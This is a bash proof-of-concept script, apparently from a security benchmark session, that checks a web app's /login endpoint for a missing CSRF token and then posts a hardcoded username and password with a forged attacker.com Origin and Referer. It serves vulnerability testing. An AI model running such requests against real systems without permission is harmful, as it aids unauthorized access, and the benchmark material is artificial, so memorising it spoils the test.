#!/bin/bash
# POC: POC demonstrating CSRF vulnerability on login form - shows that login requests from cross-origin sources are accepted without CSRF token validation
# Target: ./repo
# Created: 2025-12-01T16:10:03.123Z
# Session: benchmark-XBEN-099-24-minc74t1

# CSRF Vulnerability POC - Login Form
# This POC demonstrates that the /login endpoint accepts requests from cross-origin sources
# without CSRF token validation, allowing CSRF attacks

TARGET_URL="${1:-http://localhost:3000}"
LOGIN_ENDPOINT="/login"
ATTACKER_ORIGIN="http://attacker.com"

echo "=== CSRF Protection Test on Login Form ==="
echo "Target: $TARGET_URL$LOGIN_ENDPOINT"
echo "Attacker Origin: $ATTACKER_ORIGIN"
echo ""

# Test 1: Check if login form contains CSRF token
echo "[*] Step 1: Checking if login form contains CSRF token..."
FORM_RESPONSE=$(curl -s "$TARGET_URL$LOGIN_ENDPOINT" -H "User-Agent: Mozilla/5.0")

if echo "$FORM_RESPONSE" | grep -q "csrf\|_token\|__token"; then
    echo "[+] CSRF token found in form"
    CSRF_TOKEN=$(echo "$FORM_RESPONSE" | grep -oP '(?:name=["\047]_?_?csrf["\047]|value=["\047])[^"'"'"']*' | head -1 | cut -d'=' -f2 | tr -d '"'"'"'')
    echo "    Token value: $CSRF_TOKEN"
else
    echo "[-] NO CSRF token found in login form - VULNERABLE"
fi

echo ""

# Test 2: Attempt login from cross-origin without CSRF token
echo "[*] Step 2: Attempting login from cross-origin..."
echo "    Request: POST $LOGIN_ENDPOINT"
echo "    Origin: $ATTACKER_ORIGIN"
echo "    Credentials: username=user0 password=1b2e97s80wb7d08n-"
echo ""

RESPONSE=$(curl -s -i -X POST "$TARGET_URL$LOGIN_ENDPOINT" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Origin: $ATTACKER_ORIGIN" \
  -H "Referer: $ATTACKER_ORIGIN/" \
  -d 'username=user0&password=1b2e97s80wb7d08n-' 2>&1)

echo "[*] Response:"
echo "$RESPONSE"
echo ""

# Check for successful authentication (302 redirect or session cookie)
if echo "$RESPONSE" | grep -q "302\|Location: /profile\|Set-Cookie"; then
    echo "[-] VULNERABLE: Cross-origin login request was accepted!"
    echo "    The server did not reject the CSRF attack attempt."
    echo "    This allows attackers to perform unauthorized login actions."
    exit 0
else
    echo "[+] Login request was rejected or protected"
    exit 1
fi